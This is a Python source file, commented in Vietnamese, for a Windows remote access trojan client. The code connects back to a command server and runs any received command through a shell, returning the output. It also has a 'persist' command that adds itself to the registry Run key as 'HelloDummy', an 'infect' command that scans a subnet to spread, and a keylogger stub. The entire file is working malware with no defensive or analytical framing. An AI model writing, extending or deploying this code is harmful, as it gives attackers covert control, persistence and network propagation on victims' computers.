import os
import sys
import time
import ctypes
import socket
import subprocess
import winreg as reg
from Features.Features import *
    
def add_to_registry(sock):
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    app_name = 'HelloDummy'
    # Lấy đường dẫn đến tệp thực thi
    exe_path = os.path.abspath(sys.executable)  # Sử dụng sys.executable để lấy đường dẫn tệp .exe
    exe_path_quoted = f'"{exe_path}"' if ' ' in exe_path else exe_path
    # Mở khóa Registry với quyền ghi
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as registry_key:
            # Thêm hoặc cập nhật giá trị mới
            reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, exe_path_quoted)
            response = f"Added or updated {app_name} to Registry with path: {exe_path_quoted}\n"
            time.sleep(1)
            sock.sendall(response.encode())
    except Exception as e:
        error_msg = f"Error adding to Registry: {e}\n"
        sock.sendall(error_msg.encode())

def shell(sock):
    feature = Features()
    while True:
        try:
            # Nhận dữ liệu từ server
            buffer = sock.recv(1024)
            try:
                buffer = buffer.decode('utf-8').strip()
            except UnicodeDecodeError:
                print("Received non-UTF-8 data")
                buffer = buffer.decode('latin-1').strip()  # Thay thế bằng bảng mã khác nếu cần

            total_response = ""
            # Xử lý lệnh thoát
            if buffer.startswith('q'):
                sock.close()
                os._exit(0)
            # Xử lý lệnh cd
            elif buffer.startswith('cd '):
                path = buffer[3:].strip()
                try:
                    os.chdir(path)
                    total_response = f"Changed directory to: {os.getcwd()}\n"
                except FileNotFoundError as e:
                    total_response = f"Error: {e}\n"
                sock.sendall(total_response.encode())
            # Xử lý lệnh keylog
            elif buffer.startswith('keylog'):
                total_response = "Keylogger is running\n"
                sock.sendall(total_response.encode())
            # Xử lý lệnh persist
            elif buffer.startswith('persist'):
                add_to_registry(sock)  # Gọi hàm để thêm vào Registry
            # Xử lý lệnh infect
            elif buffer.startswith('infect'):
                # Tách các tham số từ lệnh
                parts = buffer.split()
                # Đặt giá trị mặc định
                network_prefix = '10.20.25'
                target_port = 80
                start_ip = 1
                end_ip = 100
                if len(parts) >= 2:
                    network_prefix = parts[1]
                if len(parts) >= 3:
                    target_port = int(parts[2])
                if len(parts) >= 4:
                    start_ip = int(parts[3]) 
                if len(parts) >= 5:
                    end_ip = int(parts[4])
                feature.infecting(sock, network_prefix, target_port, start_ip, end_ip)
            # Xử lý các lệnh khác
            else:
                process = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                # Giải mã stdout và stderr với mã hóa 'latin-1'
                total_response = stdout.decode('latin-1') + stderr.decode('latin-1')
                sock.sendall(total_response.encode('utf-8'))  # Gửi lại đầu ra dạng byte
        except socket.error as e:
            print(f"Socket error: {e}")
            break

def main():
    serv_ip = "127.0.0.1"
    serv_port = 50000
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        try:
            sock.connect((serv_ip, serv_port))
            break
        except socket.error:
            time.sleep(1)
            
    try:
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()
